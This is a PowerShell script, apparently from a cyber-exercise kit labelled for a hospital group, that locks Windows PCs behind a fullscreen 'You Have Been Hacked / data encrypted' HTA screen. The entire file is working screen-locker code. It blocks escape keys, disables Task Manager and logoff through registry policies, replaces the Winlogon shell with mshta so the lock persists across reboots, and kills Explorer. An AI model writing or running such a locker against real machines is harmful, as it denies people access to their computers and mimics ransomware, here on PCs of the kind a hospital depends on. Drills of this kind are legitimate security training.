#==============================================================================
# LOCKOUT_PC.ps1 — Fullscreen "You Have Been Hacked" Lockout
# Deployed remotely by deploy_all.ps1 — runs locally on each PC at trigger time
#==============================================================================

$HtaPath = "C:\CyberExercise\lockscreen.hta"
$ExerciseDir = "C:\CyberExercise"

if (!(Test-Path $ExerciseDir)) { New-Item -ItemType Directory -Path $ExerciseDir -Force }

$htaContent = @'
<html>
<head>
<title>SYSTEM COMPROMISED</title>
<HTA:APPLICATION
  ID="Lockscreen"
  APPLICATIONNAME="Lockscreen"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  CONTEXTMENU="no"
  INNERBORDER="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  NAVIGABLE="no"
  SCROLL="no"
  SELECTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="maximize"
/>
<style>
  * { margin: 0; padding: 0; }
  body {
    background: #0a0a0a;
    color: #ff0000;
    font-family: 'Courier New', monospace;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
    cursor: none;
    user-select: none;
  }
  .skull {
    font-size: 80px;
    margin-bottom: 20px;
    animation: pulse 2s ease-in-out infinite;
  }
  h1 {
    font-size: 72px;
    text-transform: uppercase;
    letter-spacing: 10px;
    text-shadow: 0 0 20px #ff0000, 0 0 40px #cc0000;
    animation: glitch 1.5s infinite;
    margin-bottom: 30px;
  }
  .sub {
    font-size: 28px;
    color: #cc0000;
    letter-spacing: 5px;
    margin-bottom: 10px;
  }
  .info {
    font-size: 18px;
    color: #666;
    margin-top: 40px;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.7; transform: scale(1.05); }
  }
  @keyframes glitch {
    0%, 90%, 100% { transform: translate(0); }
    92% { transform: translate(-5px, 2px); }
    94% { transform: translate(5px, -2px); }
    96% { transform: translate(-3px, -1px); }
    98% { transform: translate(3px, 1px); }
  }
</style>
<script language="VBScript">
  Sub document_onkeydown
    Set ev = window.event
    If ev.altKey And ev.keyCode = 115 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 87 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 27 Then ev.returnValue = False
    If ev.altKey And ev.keyCode = 9 Then ev.returnValue = False
    If ev.keyCode = 122 Then ev.returnValue = False
    If ev.keyCode = 91 Or ev.keyCode = 92 Then ev.returnValue = False
  End Sub

  Sub window_onload
    window.moveTo 0, 0
    window.resizeTo screen.width, screen.height
    setInterval "self.focus", 500
  End Sub
</script>
</head>
<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false">
  <div class="skull">&#9760;</div>
  <h1>You Have Been Hacked</h1>
  <div class="sub">ALL YOUR SYSTEMS ARE COMPROMISED</div>
  <div class="sub">ALL YOUR DATA HAS BEEN ENCRYPTED</div>
  <div class="info">[ CYBER EXERCISE — HOSPICES CIVILS DE LYON ]</div>
</body>
</html>
'@

Set-Content -Path $HtaPath -Value $htaContent -Encoding UTF8

# --- Disable Task Manager ---
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force }
Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord

# --- Disable Ctrl+Alt+Del options ---
$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (!(Test-Path $regPath2)) { New-Item -Path $regPath2 -Force }
Set-ItemProperty -Path $regPath2 -Name "NoLogoff" -Value 1 -Type DWord
Set-ItemProperty -Path $regPath2 -Name "NoChangeStartMenu" -Value 1 -Type DWord

# --- Replace Windows Shell (survives reboot) ---
$shellRegPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
if (!(Test-Path $shellRegPath)) { New-Item -Path $shellRegPath -Force }
Set-ItemProperty -Path $shellRegPath -Name "Shell" -Value "mshta.exe $HtaPath" -Type String

# --- Kill Explorer and launch lockscreen ---
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Start-Process "mshta.exe" -ArgumentList $HtaPath
